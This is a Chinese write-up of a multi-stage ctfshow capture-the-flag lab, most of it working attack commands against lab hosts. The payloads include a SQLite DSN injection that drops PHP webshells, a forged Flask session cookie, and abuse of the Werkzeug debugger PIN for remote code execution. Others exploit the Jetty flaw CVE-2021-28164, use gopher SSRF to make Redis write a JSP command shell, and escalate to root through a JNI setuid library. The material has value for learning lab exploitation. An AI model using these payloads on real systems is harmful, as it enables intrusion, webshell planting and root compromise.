    log_file = request.args.get('logFile')
    with open(join('log', basename(log_file)), 'r') as f:
        return {'message': 'log content', 'content': f.read()}

def clear_log_file(file_path):
    with open(file_path, 'w'): pass

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8888)  # 生产环境应关闭debug模式
```

## 横向渗透

![1](QQ20250319-161037.jpg)

拿到IP，那可以对这整个网段进行爆破`172.2.199.4`

![1](QQ20250319-161547.jpg)

汇总一下是怎么回事

```
172.2.142.6:8888  有个flask
172.2.142.4 本机
172.2.142.7:8080  jelly server  Jetty(9.4.40.v20210413)
172.2.142.5 有个php
```

## 跳岛战术

```html
<!DOCTYPE html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Database TEST</title>
    <script>
        // [!] 安全警告：密钥不应在前端暴露
        const DATABASE_SECRET_KEY = '0x8F7C71E8E82E4D1E';
    </script>
</head>
<body>
    <h1>Welcome to Database TEST</h1>
    <p>This is a test page for database connection and queries.</p>
    
    <!-- [!] 安全警告：敏感凭证应使用POST方法传输 -->
    <form action="index.php" method="get">
        <label for="name">Enter Database username:</label>
        <input type="text" id="name" name="username" required>
        <br><br>
        
        <label for="password">Enter Database password:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        
        <label for="dsn">Enter Database DSN:</label>
        <input type="text" id="dsn" name="dsn" required>
        <br><br>
        
        <label for="query">Enter TEST Query:</label>
        <input type="text" id="query" name="query" required>
        <br><br>
        
        <input type="submit" value="Submit">
    </form>
</body>
</html>
```

这东西我就看不出来啥(不如AI)，他说可能是个注入漏洞，并且在index.php，参数都给出来了，那可以试试注入，提示里面说是**sqlite**，**sqlite**连接不需要密码。这里用户名密码直接空着就能连接

```
http://172.2.195.5/?username=1%26password=1%26query=CREATE TABLE users (name TEXT);%26dsn=sqlite:b.php
http://172.2.195.5/?username=1%26password=1%26query=INSERT INTO users (name) VALUES ('<?php file_put_contents("4.php","<?php system(\$_GET[1]);?>");?>');%26dsn=sqlite:b.php
http://172.2.195.5/b.php
http://172.2.195.5/4.php?1=whoami
```

这些注入语句都看不懂，没接触过sqlite写入木马，`dsn`指定数据库存储路径 

## 邮箱迷云

没看到什么东西，直接交图片里面的`ctfshow{81192}`

## 再下一城

要读取**log_server_key.txt**，我们之前知道有个flask服务在一个服务器上面，放到本地草草的看了一下

![1](QQ20250319-164813.jpg)

出了好几道flask的题了，伪造一个session访问就可以拿到

```
flask-unsign --sign --cookie "{'user': 'admin'}" --secret '3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'

eyJ1c2VyIjoiYWRtaW4ifQ.Z9qFNA.UvZE2sU1gq_M8EsPwNDZQDfj-Hg
```

```
http://172.2.142.5/4.php?1=curl -H 'Cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9qFNA.UvZE2sU1gq_M8EsPwNDZQDfj-Hg' http://172.2.142.6:8888/key
```

## 顺藤摸瓜

让我RCE意思是，注意看Debug为true，应该是能打pin的

![1](QQ20250319-193200.jpg)

之前SHCTF里面涉及的还是flask来打，其中需要来调用一个Cookie来表示本地，但是现在貌似是Werkzeug里面的pin来的，跟进进来

![1](QQ20250319-193802.jpg)

需要secret，我们先设置日志来记录flask

```
# 设置log
/set_log_option?logFile=main.log&logName=werkzeug
# 获得console页面SECRET
/console
# 把pin码输出到log
/set_log_option?__debugger__=yes&cmd=printpin&s=xhFaxvHFZatNvMdOjdhI
# 读log得到pin
/get_log_content?logFile=main.log

curl 'http://172.2.195.6:8888/set_log_option?logFile=main.log%2526logName=werkzeug' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg"

curl 'http://172.2.195.6:8888/console' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg"

curl 'http://172.2.195.6:8888/set_log_option?__debugger__=yes%2526cmd=printpin%2526s=xhFaxvHFZatNvMdOjdhI' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg"

curl 'http://172.2.195.6:8888/get_log_content?logFile=main.log' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg"
```

获得了`SECRET = "xhFaxvHFZatNvMdOjdhI";`以及pin值为`129-773-657`，来确认一下对了没

```
/set_log_option?__debugger__=yes&cmd=pinauth&pin=129-773-657&s=xhFaxvHFZatNvMdOjdhI

curl 'http://172.2.195.6:8888/set_log_option?__debugger__=yes%2526cmd=pinauth%2526pin=129-773-657%2526s=xhFaxvHFZatNvMdOjdhI' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg" -i
```

![1](QQ20250319-205610.jpg)

爆出Cookie，` __wzd8ebaf5167de8bca404e8=1742388963|e4901d753a95;`，RCE就完了

```
/console?__debugger__=yes&cmd=__import__('os').popen('whoami').read()&frm=0&s=xhFaxvHFZatNvMdOjdhI
Cookie:  __wzd8ebaf5167de8bca404e8=1742388963|e4901d753a95;

curl "http://172.2.195.6:8888/console?__debugger__=yes%2526cmd=print(__import__('os').popen('cat%252509/etc/passwd').read())%2526frm=0%2526s=xhFaxvHFZatNvMdOjdhI" --cookie " __wzd8ebaf5167de8bca404e8=1742388963|e4901d753a95;"
```

这种方法真是干净利落太多了，二次编码绕过，爽，并且发现

## 艰难的最后一步

CVE-2021-28164直接利用

```http
GET /downloadTaskFile?url=http://172.2.142.7:8080/.%2500/WEB-INF/web.xml HTTP/1.1
Host: 90a753e3-217d-48aa-b9bd-f9d57fe86ccd.challenge.ctf.show
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTc0MjQ1NTA1N30.8XOs01Auacld0KrcFmznnB09_-RcbF97YAOAcei6byY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Ch-Ua-Mobile: ?0
Origin: https://task.ctfer.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://task.ctfer.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=1, i
Connection: close


```

得到

```
服务配置泄露：
  - Redis连接信息：
    ├─ host: localhost
    ├─ port: 6380
    ├─ password: ctfshow_2025（高危敏感信息！）
    └─ timeout: 10000ms
  - 应用路径：
    └─ /opt/jetty/webapps/ROOT/
  - Web服务器：
    └─ Jetty 9.4.40.v20210413（2021年版本，存在已知漏洞）

```

## 功亏一篑

打redis写马进去，但是是个无回显，不过，我们知道目录，可以写出来访问[webshell怎么写](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html) 但是文章里面说的是php，我们这里是Java，所以写Runtime就好了，还有一个细节，**quit**，用dict协议或者gopherus都可以

```
http://172.2.142.5/4.php?1=curl -v "dict://172.2.142.7:6380/auth:ctfshow_2025"
```

然后我在网上找了脚本但是好像不是很好用

```
auth ctfshow_2025
config set dir /opt/jetty/webapps/ROOT/
config set dbfilename 1.jsp
set mars "<% Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",request.getParameter(\"cmd\")});%>"
save
quit
```

url编码一下

```
auth%20ctfshow_2025%0D%0Aconfig%20set%20dir%20/opt/jetty/webapps/ROOT/%0D%0Aconfig%20set%20dbfilename%20test123.jsp%0D%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22,%5C%22-c%5C%22,request.getParameter(%5C%22cmd%5C%22)%7D);%25%3E%22%0D%0Asave%0D%0Aquit
```

然后拼接上协议

```
gopher://172.2.142.7:6380/_auth%20ctfshow_2025%0D%0Aconfig%20set%20dir%20/opt/jetty/webapps/ROOT/%0D%0Aconfig%20set%20dbfilename%20test123.jsp%0D%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22,%5C%22-c%5C%22,request.getParameter(%5C%22cmd%5C%22)%7D);%25%3E%22%0D%0Asave%0D%0Aquit
```

发现怎么都写不上，不知道为啥，只能重新写一个木马进去

```
http://172.2.245.5/?username=1%26password=1%26query=CREATE TABLE users (name TEXT);%26dsn=sqlite:a.php
http://172.2.245.5/?username=1%26password=1%26query=INSERT INTO users (name) VALUES ('<?php file_put_contents("1.php","<?php @eval(\$_GET[1]);?>");?>');%26dsn=sqlite:a.php
http://172.2.245.5/a.php
http://172.2.245.5/1.php?1=system("whoami");
```

在利用base给马写进去

```
curl -v "gopher://172.2.245.7:6380/_auth%20ctfshow_2025%0D%0Aconfig%20set%20dir%20/opt/jetty/webapps/ROOT/%0D%0Aconfig%20set%20dbfilename%20test123.jsp%0D%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22,%5C%22-c%5C%22,request.getParameter(%5C%22cmd%5C%22)%7D);%25%3E%22%0D%0Asave%0D%0Aquit"

http://172.2.245.5/1.php?1=system(base64_decode('Y3VybCAtdiAiZ29waGVyOi8vMTcyLjIuMjQ1Ljc6NjM4MC9fYXV0aCUyMGN0ZnNob3dfMjAyNSUwRCUwQWNvbmZpZyUyMHNldCUyMGRpciUyMC9vcHQvamV0dHkvd2ViYXBwcy9ST09ULyUwRCUwQWNvbmZpZyUyMHNldCUyMGRiZmlsZW5hbWUlMjB0ZXN0MTIzLmpzcCUwRCUwQXNldCUyMG1hcnMlMjAlMjIlM0MlMjUlMjBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyUyMFN0cmluZyU1QiU1RCU3QiU1QyUyMnNoJTVDJTIyLCU1QyUyMi1jJTVDJTIyLHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCU1QyUyMmNtZCU1QyUyMiklN0QpOyUyNSUzRSUyMiUwRCUwQXNhdmUlMEQlMEFxdWl0Ig=='));

http://172.2.245.7:8080/test123.jsp?cmd=ls%20/>/opt/jetty/webapps/ROOT/1.txt

http://172.2.245.7:8080/1.txt

http://172.2.245.7:8080/test123.jsp?cmd=cat%20/dylan.txt>/opt/jetty/webapps/ROOT/2.txt

http://172.2.245.7:8080/2.txt
```

## 今日方知我是我

直接写发现不行，找一下特权文件

```
getcap -r / 2>/dev/null

http://172.2.245.7:8080/test123.jsp?cmd=getcap%20-r%20/%202>/dev/null>/opt/jetty/webapps/ROOT/4.txt
```

![1](QQ20250319-182420.jpg)

发现Java有setuid权限，

```c
#include <jni.h>
#include <unistd.h>

JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) {
    return setuid(uid);
}
```

```
http://172.2.245.7:8080/test123.jsp?cmd=echo%20"I2luY2x1ZGUgPGpuaS5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQpKTklFWFBPUlQgamludCBKTklDQUxMIEphdmFfU2V0VUlEX3NldFVJRChKTklFbnYgKmVudiwgam9iamVjdCBvYmosIGppbnQgdWlkKSB7DQogICAgcmV0dXJuIHNldHVpZCh1aWQpOw0KfQ=="%20|base64%20-d%20>/opt/jetty/webapps/ROOT/SetUID.c
```

```java
public class SetUID {
    static {
        System.loadLibrary("SetUID");
    }

    public native int setUID(int uid);
    public static void main(String[] args) throws Exception {
        SetUID setUID = new SetUID();
        int result = setUID.setUID(0);
        Runtime.getRuntime.exec(new String[]{"sh","-c","cat /root/*.txt>/opt/jetty/webapps/ROOT/root.txt"});
    }
}
```

```
http://172.2.245.7:8080/test123.jsp?cmd=echo%20"cHVibGljIGNsYXNzIFNldFVJRCB7DQogICAgc3RhdGljIHsNCiAgICAgICAgU3lzdGVtLmxvYWRMaWJyYXJ5KCJTZXRVSUQiKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgbmF0aXZlIGludCBzZXRVSUQoaW50IHVpZCk7DQogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgdGhyb3dzIEV4Y2VwdGlvbiB7DQogICAgICAgIFNldFVJRCBzZXRVSUQgPSBuZXcgU2V0VUlEKCk7DQogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOw0KICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUuZXhlYyhuZXcgU3RyaW5nW117InNoIiwiLWMiLCJjYXQgL3Jvb3QvKi50eHQ+L29wdC9qZXR0eS93ZWJhcHBzL1JPT1Qvcm9vdC50eHQifSk7DQogICAgfQ0KfQ=="%20|base64%20-d%20>/opt/jetty/webapps/ROOT/SetUID.java
```

再对这两个文件进行编译，c文件编译成恶意so文件，供Java文件加载

```
http://172.2.245.7:8080/test123.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I${JAVA_HOME}/include%20-I${JAVA_HOME}/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c

http://172.2.245.7:8080/test123.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java
```

就可以root来执行命令了

```
http://172.2.245.7:8080/test123.jsp?cmd=java%20-Djava.library.path=/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID

http://172.2.245.7:8080/root.txt
```

里面最看不懂的两个命令就是

```
java -Djava.library.path=/opt/jetty/webapps/ROOT/ -cp /opt/jetty/webapps/ROOT/ SetUID
```

| 参数部分                  | 作用                               |
| ------------------------- | ---------------------------------- |
| `-Djava.library.path=...` | 指定JNI动态库（.so文件）的搜索路径 |
| `-cp ...`                 | 指定类文件（.class）的搜索路径     |
| `SetUID`                  | 要执行的Java主类                   |

```
gcc -shared -fPIC -o /opt/jetty/webapps/ROOT/libSetUID.so -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux /opt/jetty/webapps/ROOT/SetUID.c
```

`-shared`生成动态库，`-fPIC`确保代码可被加载到内存任意地址，并且这一关我还总是不能成功，后面发现原来是我恶意的Java文件里面有多余的不可见字符

## 小结

感觉有一些地方确实是需要猜的，但是整体来说简直了，有意思！IP不一样是因为我开了好几次靶机，其中顺藤摸瓜做完之后发现和SHCTF的一模一样，都是同一个洞，但是我还是打了很久很久，两个小时以上😔
